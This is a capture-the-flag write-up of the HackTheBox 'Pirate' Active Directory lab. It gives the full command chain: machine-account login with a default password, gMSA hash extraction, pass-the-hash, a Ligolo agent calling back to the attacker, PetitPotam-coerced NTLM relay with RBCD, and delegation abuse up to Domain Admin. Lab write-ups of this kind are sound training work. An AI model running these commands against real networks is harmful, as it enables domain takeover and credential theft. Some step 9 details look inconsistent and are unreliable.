---
title: "HTB - Pirate"
date: 2026-04-26
tags: ["HackTheBox","Windows","Hard","ActiveDirectory","gMSA","NTLMRelay","ConstrainedDelegation","Ligolo","Pre-Win2000"]
categories: ["Machines&Challenges"]
difficulty: "Hard"
os: "Windows"
author: "z3r0s"
featuredImage: "/logos/Pirate.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Hard |
| OS | Windows (Active Directory) |
| Domain | PIRATE.HTB |

---

## Summary

Pirate is a Hard-rated multi-host Windows Active Directory machine simulating a realistic corporate environment with three domain-joined machines. The attack chains **six distinct AD primitives** with no CVEs required - every step exploits misconfigurations:

**Pre-Windows 2000 Compatible Access** (MS01$ machine account auth) → **gMSA password extraction** via LDAP → **Pass-the-Hash** over WinRM on DC01 → **L3 network pivot** via Ligolo-ng to the internal `192.168.100.0/24` subnet → **NTLM relay** to LDAPS with RBCD to gain WEB01 Administrator → user flag → **SPN injection** with Constrained Delegation abuse to impersonate Domain Admin on DC01 → root flag.

---

## Network Topology

```
PIRATE.HTB Domain
├── DC01.pirate.htb  (<IP_MACHINE>)  - Windows Server 2019 / KDC / LDAP / WinRM
├── MS01.pirate.htb  - Pre-Win2000 group member / Machine pw = hostname
└── WEB01.pirate.htb (192.168.100.2) - Internal only ← user.txt lives here

Attacker: <IP_KALI>  (direct access to DC01 only)
```

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | nmap - Windows AD stack | - |
| 2 | Clock Sync | faketime to handle +7h03m Kerberos skew | - |
| 3 | Pre-Win2000 | MS01$ TGT - password = machine name | NetExec pre2k |
| 4 | gMSA Dump | ReadGMSAPassword → NTLM hash | LDAP |
| 5 | WinRM on DC01 | Pass-the-Hash → foothold | evil-winrm |
| 6 | Pivot to WEB01 | Ligolo-ng transparent L3 tunnel | Ligolo-ng |
| 7 | NTLM Relay + RBCD | Relay MS01$ to LDAPS → delegate over WEB01 | ntlmrelayx |
| 8 | User flag | RBCD S4U2Proxy → WEB01 Administrator → `user.txt` | impacket |
| 9 | SPN + Constrained | WriteSPN → S4U2Self → impersonate DA on DC01 | impacket |
| 10 | Root | Domain Admin shell → `root.txt` | - |

---

## 01 - Environment Setup

```bash
# /etc/hosts
sudo bash -c 'echo "<IP_MACHINE> DC01.pirate.htb pirate.htb MS01.pirate.htb" >> /etc/hosts'
sudo bash -c 'echo "192.168.100.2 WEB01.pirate.htb" >> /etc/hosts'

# Kerberos config
sudo bash -c 'cat > /etc/krb5.conf << EOF
[libdefaults]
  default_realm = PIRATE.HTB
[realms]
  PIRATE.HTB = { kdc = <IP_MACHINE> admin_server = <IP_MACHINE> }
[domain_realm]
  .pirate.htb = PIRATE.HTB
EOF'

# Python venv for impacket
python3 -m venv env && source env/bin/activate
pip install impacket gssapi ldap3
```

---

## 02 - Recon

```bash
nmap -sC -sV -T4 -p- <IP_MACHINE> --open -oN nmap_full.txt
```

```
# Key ports:
53/tcp    DNS        Simple DNS Plus
88/tcp    Kerberos
389/tcp   LDAP       Active Directory
445/tcp   SMB        (signing REQUIRED)
5985/tcp  WinRM
# Critical: clock skew +7h03m29s - Kerberos rejects > ±5min
```

---

## 03 - Clock Synchronisation

Kerberos rejects tickets with a clock skew greater than ±5 minutes. The DC's clock is ~7 hours ahead.

```bash
# Get DC time
nmap -sV --script smb2-time -p 445 <IP_MACHINE>

# Option 1 - faketime
sudo apt install faketime
faketime '2026-03-01 22:11:44' bash

# Option 2 - sync system clock
sudo timedatectl set-ntp false
sudo date -s '2026-03-01 22:11:44'
```

---

## 04 - Pre-Windows 2000 Compatible Access → TGT for MS01$

Pre-created computer accounts commonly have their password set to the `sAMAccountName` (minus the trailing `$`). This allows authentication as the machine account without prior credentials.

```bash
# Use NetExec pre2k module
netexec ldap <IP_MACHINE> -u '' -p '' -M pre2k

# Or impacket directly
getTGT.py PIRATE.HTB/MS01\$:'MS01' -dc-ip <IP_MACHINE>
# [*] Saving ticket in MS01$.ccache

export KRB5CCNAME=MS01\$.ccache
```

---

## 05 - gMSA Password Extraction → NTLM Hash

```bash
# Read gMSA managed password via LDAP as MS01$
python3 gMSADumper.py -u 'MS01$' -p 'MS01' -d pirate.htb -l <IP_MACHINE>

# OR using bloodyAD
bloodyAD -u 'MS01$' -p 'MS01' -d PIRATE.HTB \
  --host <IP_MACHINE> get object 'gMSA_svc$' \
  --attr msds-ManagedPassword

# Output:
gMSA_svc$:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

---

## 06 - Pass-the-Hash → WinRM Foothold on DC01

```bash
evil-winrm -i <IP_MACHINE> -u 'gMSA_svc$' -H '<NTLM_HASH>'

*Evil-WinRM* PS C:\Users\gMSA_svc$\> whoami
pirate\gMSA_svc$
```

---

## 07 - Pivot to WEB01 via Ligolo-ng

```bash
# On Kali - start Ligolo-ng proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On DC01 (Evil-WinRM) - upload and run agent
*Evil-WinRM* PS> upload ligolo_agent.exe
*Evil-WinRM* PS> .\ligolo_agent.exe -connect <IP_KALI>:11601 -ignore-cert

# On Kali Ligolo console
ligolo-ng >> session
ligolo-ng >> tunnel_start --tun ligolo

# Add route to internal subnet
sudo ip route add 192.168.100.0/24 dev ligolo
ping -c1 192.168.100.2  # WEB01 now reachable
```

---

## 08 - NTLM Relay + RBCD → WEB01 Administrator

By coercing MS01$ to authenticate to our machine (via PetitPotam), we relay its NTLM credentials to LDAPS on the DC. `ntlmrelayx` creates a backdoor machine account and configures RBCD over WEB01.

```bash
# Step 1 - Start relay targeting LDAPS
ntlmrelayx.py -t ldaps://<IP_MACHINE> --delegate-access --add-computer FAKE01

# Step 2 - Coerce MS01$ authentication
PetitPotam.py <IP_KALI> MS01.pirate.htb
# [+] Created machine account: FAKE01$ password: <auto>
# [+] Delegated access configured: FAKE01$ → WEB01

# Step 3 - S4U2Proxy to get service ticket as Administrator
getST.py -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  PIRATE.HTB/FAKE01\$:'<password>'

export KRB5CCNAME=Administrator@cifs_WEB01.ccache

# Step 4 - Access WEB01
wmiexec.py -k -no-pass Administrator@WEB01.pirate.htb
# C:\Users\Administrator> type C:\Users\<user>\Desktop\user.txt
```

---

## 09 - SPN Injection + Constrained Delegation → Domain Admin

If a compromised account has `WriteSPN` rights, an attacker can add an arbitrary SPN. Combined with Constrained Delegation, `S4U2Self` yields a service ticket for any user - including Domain Admins.

```bash
# Find accounts with WriteSPN privilege via BloodHound
bloodhound-python -u Administrator -H <HASH> -d PIRATE.HTB -ns <IP_MACHINE> -c All

# Add SPN to target account
addspn.py -u PIRATE.HTB\\<account> -p <password> \
  -s cifs/pivot.pirate.htb -t <target_account>

# S4U2Self - get ticket impersonating DA
getST.py -spn cifs/pivot.pirate.htb \
  -impersonate Administrator \
  -self PIRATE.HTB/<target_account>:'<password>'

export KRB5CCNAME=Administrator.ccache

# WinRM as Domain Admin on DC01
wmiexec.py -k -no-pass Administrator@DC01.pirate.htb
# C:\Users\Administrator> type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Techniques & MITRE ATT&CK

| Technique | Description | MITRE ID |
|-----------|-------------|----------|
| Pre-Windows 2000 Auth | Authenticate as MS01$ using hostname as password | T1078.002 |
| gMSA Password Read | ReadGMSAPassword via LDAP | T1552.001 |
| Pass-the-Hash | WinRM access using NTLM hash | T1550.002 |
| Network Pivoting | Ligolo-ng L3 tunnel to 192.168.100.0/24 | T1090.001 |
| NTLM Relay to LDAPS | Relay MS01$ auth → create machine + set RBCD | T1557.001 |
| RBCD / S4U2Proxy | Impersonate Administrator on WEB01 | T1134.001 |
| SPN Injection | Add SPN via WriteSPN → enable constrained deleg | T1558.003 |
| Constrained Delegation | S4U2Self → DA ticket on DC01 | T1134.001 |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan, `smb2-time` for clock skew detection |
| faketime | Handle Kerberos +7h clock skew |
| NetExec / pre2k | Pre-Windows 2000 machine account authentication |
| getTGT.py | Kerberos TGT request (impacket) |
| gMSADumper.py | Extract gMSA managed passwords via LDAP |
| evil-winrm | Pass-the-Hash WinRM shell |
| Ligolo-ng | Transparent L3 network pivot (proxy + agent) |
| ntlmrelayx.py | NTLM relay to LDAPS + RBCD machine account creation |
| PetitPotam.py | Coerce MS01$ NTLM authentication for relay |
| getST.py | S4U2Self / S4U2Proxy service ticket requests |
| BloodHound | AD graph analysis for delegation and WriteSPN paths |
| wmiexec.py | Kerberos-authenticated command execution |
